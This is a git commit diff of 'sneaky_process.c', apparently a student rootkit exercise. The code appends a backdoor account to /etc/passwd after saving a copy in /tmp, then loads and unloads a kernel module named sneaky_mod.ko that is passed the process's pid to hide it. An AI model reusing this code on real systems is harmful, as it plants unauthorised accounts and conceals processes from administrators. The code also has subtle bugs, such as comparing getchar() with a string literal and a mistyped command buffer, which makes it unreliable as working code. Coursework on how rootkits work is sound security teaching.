9c50ca5219d78cde8c5f4b9961e0c889d75d0136
Kaifeng Yu <kaifeng.yu625@outlook.com>
2022-04-08 03:16:50 -0400

    finish sneaky process

--- sneaky_process.c
+++ sneaky_process.c
@@ -31,25 +31,35 @@ void append_to_file(char * file, char * content) {
   fclose(f);
 }
 
-void load_sneaky_module(char * module) {
+void load_sneaky_module() {
   char * command[60]; 
   snprintf(command, 60, "insmod sneaky_mod.ko pid=%d", (int)getpid());
-  system(command);
+  int res = system(command);
+  if (res == -1) {
+    printf("Can not load sneaky module.\n");
+    exit(EXIT_FAILURE);
+  }
 }
 
 void read_from_keyboard() {
-
+  while (getchar() != "q") {
+  }
 }
 
 void unload_sneaky_module() {
-}
-
-void restore_file(char * in_file, char * out_file) {
+  int res = system("rmmod sneaky_mod.ko");
+  if (res == -1) {
+    printf("Can not unload sneaky module.\n");
+    exit(EXIT_FAILURE);
+  }
 }
 
 int main() {
   printf("sneaky_process pid = %d\n", getpid());
   create_new_file("/etc/passwd", "/tmp/passwd");
   append_to_file("/etc/passwd", "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n");
-  load_sneaky_module("sneaky_mod.ko");
+  load_sneaky_module();
+  read_from_keyboard();
+  unload_sneaky_module();
+  create_new_file("/tmp/passwd", "/etc/passwd");
 }
